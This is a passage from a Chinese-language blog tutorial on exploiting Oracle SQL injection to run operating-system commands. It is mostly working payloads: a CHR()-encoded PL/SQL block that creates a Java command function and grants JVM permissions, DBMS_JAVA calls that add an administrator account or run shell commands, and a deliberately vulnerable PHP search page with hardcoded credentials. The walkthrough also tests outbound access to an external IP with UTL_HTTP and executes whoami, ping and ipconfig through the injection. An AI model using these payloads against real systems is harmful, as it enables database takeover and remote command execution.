32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||CHR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(50)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(114)||CHR(101)||CHR(97)||CHR(100)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(68)||CHR(101)||CHR(115)||CHR(99)||CHR(114)||CHR(105)||CHR(112)||CHR(116)||CHR(111)||CHR(114)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(42)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
' and 1=myjava2()--
' and 1=2 union select 1,(select javacmd('whoami') from dual),3 from dual--

如果有了java.io.permisson(or javasyspriv)权限的话也可以调用下面有漏洞的包直接执行系统命令
DBMS_JAVA.RUNJAVA() 11g R1 and R2
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c net user admin password /add') FROM DUAL;
DBMS_JAVA_TEST.FUNCALL()  10g R2, 11g R1 and R2
Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pwd > /tmp/pwd.txt') from dual;
Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','dir > c:\\pwd.txt') from dual; #windows ORA-29540: class oracle/aurora/util/Wrapper does not exist
```

### 0x3 实战
这里利用上面的一个总结，进行一个实战。

```
数据库表如下：
create table users(id int,name varchar(255),age int);
INSERT INTO users VALUES ('1', 'test', '22');
INSERT INTO users VALUES ('2', 'admin', '33');
INSERT INTO users VALUES ('3', 'aaaa', '44');
commit;
服务端代码如下：
<?php
function query($name) {
    $db = "(DESCRIPTION=(ADDRESS_LIST = (ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.44.157)(PORT = 1521)))(CONNECT_DATA=(SID=orcl)))"; 
    $conn = oci_connect('TEST', 'test123456789', $db);
    if (! $conn) {
        die('Cannot connect to the database: '. oci_error());
    }
    $stat = oci_parse($conn, "SELECT id,name,age FROM TEST.users WHERE name LIKE '%". $name ."%'");
    echo "SELECT id,name,age FROM TEST.users WHERE name LIKE '%". $name ."%'";
    oci_execute($stat);
    if ($stat) {
        echo '<table>';
        echo '<tr><th>ID</th><th>Name</th><th>Age</th></tr>';
        while (($row = oci_fetch_array($stat, OCI_BOTH)) != false) {
            echo '<tr>';
            echo '<td>'. $row['ID'] .'</td>';
            echo '<td>'. htmlspecialchars($row['NAME']) .'</td>';
            echo '<td>'. $row['AGE'] .'</td>';
            echo '</tr>';
        }
        echo '</table>';
    }
    oci_free_statement($stat);
    oci_close($conn);
}

if (isset($_POST['name']) && !empty($_POST['name'])) {
    query($_POST['name']);
}

?>

<form method="POST">
<input type="text" name="name" length="15"><input type="submit" value="Search">
</form>
```
搜索框注入 搜索a 可以看到相关sql语句 
 ![image](/images/posts/hackingoracle/WX20180619-171718@2x.png)
```   
' and 1 = ctxsys.drithsx.sn(1,(select user from dual))--
 查当前用户 TEST
```
  ![image](/images/posts/hackingoracle/2.png) 
```
' and 1 = ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'))--
 查看版本 Oracle Database 10g Enterprise Edition Release 10.2.0.3.0 
``` 
  ![image](/images/posts/hackingoracle/3.png) 
```
' and UTL_HTTP.REQUEST('http://74.121.151.89:53')='1'--判断能否出网 能出网
``` 
```
 ' and 1 = ctxsys.drithsx.sn(1,(select wmsys.wm_concat(granted_role) from user_role_privs))--
查当前用户权限 CONNECT,RESOURCE
``` 
  ![image](/images/posts/hackingoracle/4.png) 
提权到dba皆失败  
11.1.0.7.0以下可以用dbms_xmlquery.newcontext来执行pl/sql来执行命令(命令在上面)
  ![image](/images/posts/hackingoracle/5.png) 
依次执行上面sql语句后 可以在navicat中查看
执行select * from user_objects可以查看相关函数是否创建成功
![image](/images/posts/hackingoracle/6.png) 
执行select * from user_java_policy 查看其相应的权限是否加上
![image](/images/posts/hackingoracle/7.png) 
在web中 可以使用下面的语句来判断是否加上
```
' and 1 = ctxsys.drithsx.sn(1,(select count(*) from user_java_policy where grantee_name='TEST'))--
' and 1 = ctxsys.drithsx.sn(1,(select * from user_objects where OBJECT_NAME='javaexec'))--
```
最后执行命令 whoami会报错(具体原因不详) 但程序还是会执行 想要实时查看可以换个命令 以下分别是四个截图的效果
```
'||utl_inaddr.get_host_name((select javacmd('whoami') from dual))||'
'||utl_inaddr.get_host_name((select javacmd('ping 8.8.8.8') from dual))||'
'||utl_inaddr.get_host_name((Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','ping 74.121.151.89') from dual))||'   #注意这个不能回显
'||utl_inaddr.get_host_name((select utl_raw.cast_to_varchar2(utl_encode.base64_encode(utl_raw.cast_to_raw(javacmd('ipconfig')))) from dual))||' #有的时候使用base64加密后看着稍微舒服一点
```
whoami
![image](/images/posts/hackingoracle/8.png) 
ping 8.8.8.8
![image](/images/posts/hackingoracle/9.png) 
DBMS_JAVA_TEST.FUNCAL
![image](/images/posts/hackingoracle/10.png) 
base64 encode
![image](/images/posts/hackingoracle/12.png) 
一些需要注意的坑：
* 有的语句直接放到navicat里面是可以执行的，但是通过web执行会出问题，所有建议本地测试后再转码运行，一般情况下oracle中双引号会包含特定字符，所以一般会看到一些''''成对的双引号，转码时''''变成'' ''变成' '直接去除就可以了。   
其他参考链接如下：
``` 
https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/
https://www.t00ls.net/articles-23608.html
https://github.com/alexei-led/docker-oracle-xe-11g
https://www.secpulse.com/archives/30872.html
http://psoug.org/articles/Hacking-Aurora-in-Oracle-11g.htm
http://www.red-database-security.com/tutorial/run_os_commands_via_webapp.html
```
#
转载请注明：[whynot](https://notwhy.github.io/) » [hacking_ora](https://notwhy.gitbooks.io//2018/06/hacking-oracle/)  


